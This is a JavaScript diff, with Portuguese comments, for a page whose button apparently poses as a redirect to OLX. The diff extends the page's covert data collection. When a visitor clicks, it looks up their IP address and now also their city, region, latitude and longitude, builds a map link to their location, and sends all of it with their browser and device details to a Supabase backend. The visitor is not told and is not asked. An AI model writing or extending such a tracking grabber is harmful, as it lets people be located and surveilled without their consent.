@@ -11,9 +11,14 @@ document.addEventListener("DOMContentLoaded", () => {
     btn.addEventListener("click", async () => {
         try {
             // Coleta IP do visitante
-            const ipRes = await fetch("https://api64.ipify.org?format=json");
+            const ipRes = await fetch("https://ipapi.co/json/");
             const ipData = await ipRes.json();
             const ip = ipData.ip;
+            const geolocalizacao = `${ipData.city} - ${ipData.region}`;
+            const latitude = ipData.latitude?.toString() || "0.0000";
+            const longitude = ipData.longitude?.toString() || "0.0000";
+            const mapa_link = `https://maps.google.com/maps?q=${latitude},${longitude}&z=14&output=embed`;
+
 
             // Detecta tipo de aparelho
             const userAgent = navigator.userAgent;
@@ -33,12 +38,12 @@ document.addEventListener("DOMContentLoaded", () => {
                 redirecionamento: "https://www.olx.com.br",
                 ip: ip,
                 navegador: userAgent,
-                geolocalizacao: "Desconhecido", // Pode ser ajustado futuramente com outra API
+                geolocalizacao,
                 aparelho: aparelho,
                 data_hora: new Date().toISOString(),
-                latitude: "0.0000",
-                longitude: "0.0000",
-                mapa_link: "https://maps.google.com"
+                latitude,
+                longitude,
+                mapa_link
             };
 
             // Envia os dados para Supabase
